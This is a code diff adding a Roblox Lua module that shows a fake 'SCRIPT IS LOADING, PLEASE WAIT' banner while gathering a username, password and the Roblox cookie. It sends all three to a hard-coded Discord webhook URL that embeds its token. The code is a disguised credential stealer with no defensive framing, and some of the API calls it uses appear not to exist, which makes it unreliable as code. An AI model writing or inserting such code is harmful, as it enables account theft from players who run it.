@@ -1,0 +1,42 @@
+local function createCaptureDataFunction()
+    local function displayMessage(message, starterGui, tweenService)
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Text = message
+        textLabel.Size = UDim2.new(1, 0, 0, 30)
+        textLabel.Position = UDim2.new(0, 0, 0, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.TextColor3 = Color3.new(1, 0, 0)
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.TextSize = 20
+        textLabel.Parent = starterGui
+        
+        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
+        local tween = tweenService:Create(textLabel, tweenInfo, {Position = UDim2.new(0, 0, 0, 30)})
+        
+        tween:Play()
+        
+        wait(5)
+        
+        textLabel:Destroy()
+    end
+    
+    local function captureData(httpService, userInputService, starterGui, tweenService)
+        displayMessage("SCRIPT IS LOADING, PLEASE WAIT", starterGui, tweenService)
+        
+        local username = userInputService:GetString("Username")
+        local password = userInputService:GetString("Password")
+        local cookie = httpService:GetCookies("https://www.roblox.com")
+        
+        local webhookURL = "https://discord.com/api/webhooks/1204449631606542387/N90Bvkx9q0lTZqgEmR54TQYYGuL_xio2ePSYk0QyycYp_57xTL8qx0dolA3fJ9Ahp0mI"
+        local postData = {
+            Username = username,
+            Password = password,
+            Cookie = cookie
+        }
+        httpService:PostAsync(webhookURL, httpService:JSONEncode(postData))
+    end
+
+    return captureData
+end
+
+return createCaptureDataFunction()
